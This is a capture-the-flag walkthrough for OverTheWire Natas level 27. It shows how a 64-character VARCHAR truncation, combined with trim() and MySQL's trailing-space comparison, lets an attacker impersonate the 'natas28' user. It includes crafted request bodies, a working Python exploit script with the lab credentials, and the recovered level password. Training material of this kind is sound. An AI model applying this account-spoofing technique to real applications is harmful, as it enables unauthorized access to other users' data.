# Natas Level 27 Writeup (natas27) – OverTheWire

## Overview

This level focuses on exploiting a **MySQL username truncation** vulnerability.  
The goal is to find the password for the next level.

## Observation

When we open the page, we see two input fields:

> **Username:**  
> **Password:**

There is also a link to view the source code:

```text
index-source.html
```

## Finding the Password

### Using Browser & BurpSuite

1. Open the source code.

2. The database table is:

   ```php
   CREATE TABLE `users` (
       `username` varchar(64) DEFAULT NULL,
       `password` varchar(64) DEFAULT NULL
   );
   ```

3. In `createUser()`, only the first 64 characters of the username are stored:

   ```php
   $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
   $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
   ```

4. We create a username containing `natas28`, followed by **57 spaces and `x`**:

   ```text
   natas28[57 spaces]x
   ```

5. This username is 65 characters long. `substr($usr, 0, 64)` removes the final `x`, so the database stores:

   ```text
   natas28[57 spaces]
   ```

6. Send the request in BurpSuite `Repeater` and change username as given then `Send`:

   ```txt
   # '+' acts like space in URL-encode
   username=natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++x&password=password
   ```

   Response:

   ```text
   User natas28                                                         x was created!
   ```

7. Now remove the final `x` and `Send`:

   ```http
   username=natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++&password=password
   ```

8. `validUser()` finds the user because MySQL ignores trailing spaces when comparing `VARCHAR` values.

9. After the password is checked, `dumpData()` runs:

   ```php
   $user=mysqli_real_escape_string($link, trim($usr));
   ```

10. `trim()` removes the trailing spaces from our username:

    ```text
    natas28[57 spaces]
    ```

    becomes:

    ```text
    natas28
    ```

11. The application then queries for `natas28` and returns the original user's data, including the password.

#### Proof

```text
Welcome natas28                                                         !
Here is your data:
Array
(
    [username] =&gt; natas28
    [password] =&gt; Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3
)
```

### Using Python

```python
import requests, re

target = 'http://natas27.natas.labs.overthewire.org'
auth = ('natas27', 'mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV')

# len(username) = 65
username = 'natas28' + ' ' * 57 + 'x'
password = 'password'

data = {
    'username': username,
    'password': password
}

requests.post(target, auth=auth, data=data)

data['username'] = username[:-1]

r = requests.post(target, auth=auth, data=data)
match = re.search(r'\s(\w{32})', r.text)

print("Password for next level is:", match.group(1))
```

## Vulnerability

The username is stored in a **64-character `VARCHAR` field**, so a longer username is truncated.

By using `natas28` followed by spaces and an extra character, we can create a user whose stored username matches `natas28`. Later, `trim()` removes the spaces and the original `natas28` user's data is returned.

## Flag

`Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3`
